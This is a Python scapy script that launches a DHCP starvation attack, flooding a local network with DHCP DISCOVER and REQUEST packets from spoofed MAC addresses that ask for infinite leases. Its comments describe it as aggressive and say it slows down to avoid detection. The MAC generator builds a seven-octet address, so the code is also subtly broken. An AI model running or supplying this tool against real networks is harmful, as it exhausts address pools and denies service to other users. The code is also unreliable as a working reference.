from scapy.all import *
import random
import time

def random_mac():
    """Generate a random MAC address."""
    return "02:%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(6))

def dhcp_starvation(interface="eth0", count=500, target_network="255.255.255.255"):
    """
    Launch an aggressive DHCP Starvation attack by sending multiple DHCP DISCOVER and REQUEST packets.

    :param interface: Network interface to use.
    :param count: Number of DHCP requests to send.
    :param target_network: Broadcast IP of the target DHCP server's subnet.
    """
    print(f"[+] Starting DHCP Starvation Attack on {interface}, targeting {target_network} with {count} requests...")

    for i in range(count):
        fake_mac = random_mac()
        print(f"[*] Sending DHCP DISCOVER from MAC: {fake_mac}")

        dhcp_discover = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
                        IP(src="0.0.0.0", dst=target_network) / \
                        UDP(sport=68, dport=67) / \
                        BOOTP(chaddr=[bytes.fromhex(fake_mac.replace(":", ""))], xid=random.randint(1, 0xFFFFFFFF)) / \
                        DHCP(options=[
                            ("message-type", "discover"),
                            ("lease_time", 0xFFFFFFFF),  # Request infinite lease
                            ("end")
                        ])

        sendp(dhcp_discover, iface=interface, verbose=False)

        time.sleep(0.1)  # Slight delay to avoid detection

        print(f"[*] Sending DHCP REQUEST from MAC: {fake_mac}")

        dhcp_request = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
                       IP(src="0.0.0.0", dst=target_network) / \
                       UDP(sport=68, dport=67) / \
                       BOOTP(chaddr=[bytes.fromhex(fake_mac.replace(":", ""))], xid=random.randint(1, 0xFFFFFFFF)) / \
                       DHCP(options=[
                           ("message-type", "request"),
                           ("lease_time", 0xFFFFFFFF),  # Request infinite lease
                           ("end")
                       ])

        sendp(dhcp_request, iface=interface, verbose=False)

    print("[+] Attack completed!")

if __name__ == "__main__":
    # Change the interface to match your system (use `ip link show` to check available interfaces)
    dhcp_starvation(interface="eth0", count=500, target_network="255.255.255.255")
